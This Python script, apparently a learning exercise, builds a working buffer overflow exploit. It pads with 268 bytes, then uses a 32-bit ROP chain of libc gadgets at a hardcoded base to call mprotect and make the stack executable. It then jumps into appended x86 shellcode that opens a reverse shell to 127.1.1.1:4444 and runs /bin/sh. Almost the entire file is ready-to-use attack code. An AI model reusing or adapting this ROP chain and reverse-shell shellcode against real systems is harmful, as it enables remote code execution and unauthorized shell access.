#!/usr/bin/python3
from pwn import p32

# 0x0003b4fc: pop edx; ret;
# 0x000a07f8: inc edx; ret;
# 0x000915a3: pop ecx; ret; 
# 0x00184049: pop ebx; ret;
# 0x0003677d: inc ebx; ret;
# 0x00119917: jmp esp;

libc_base = 0xf7d75000

junk = b"A" * 268


# this rop chain could have been done much simpler by pushin on the stack 0x7 instead of 0xffffffff (which we then need to increment), but i prefer to do it like this to really "cement" the idea in my mind.
rop = b"".join([
    p32(libc_base + 0x0003b4fc), # pop edx; ret;
    p32(0xffffffff),             # will be popped in edx
    p32(libc_base + 0x000a07f8), # inc edx; ret; => EDX contains 0x0
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8), 
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8),
    p32(libc_base + 0x000a07f8), # EDX contains 0x7
    p32(libc_base + 0x000915a3), # pop ecx; ret;
    p32(0x01010101),             # length of area to apply the rights too, popped in ECX
    p32(libc_base + 0x00184049), # pop ebx; ret;
    p32(0xfffdbfff),             # popped in EBX, to be inc right after (to avoid nullbytes)
    p32(libc_base + 0x0003677d), # inc ebx; ret; => EBX contains 0xfffdc000 (stack base address)
    p32(0xf7e8f0dd),             # <mprotect+13> aka right before the syscall executes
    p32(0x42424242),             # this will be popped in EBX, now stack is executable
    p32(libc_base + 0x00119917)  # jmp esp;
])


shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x02\xb1\x01\x66\xb8\x67\x01\xcd\x80\x89\xc3\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\x31\xc0\x66\xb8\x6a\x01\xcd\x80\x31\xc0\x31\xc9\xb0\x3f\xcd\x80\x31\xc0\xb1\x01\xb0\x3f\xcd\x80\x31\xc0\xb1\x02\xb0\x3f\xcd\x80\x31\xc0\x31\xd2\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"


payload = junk + rop + shellcode

with open("payload", "wb") as f:
        f.write(payload)
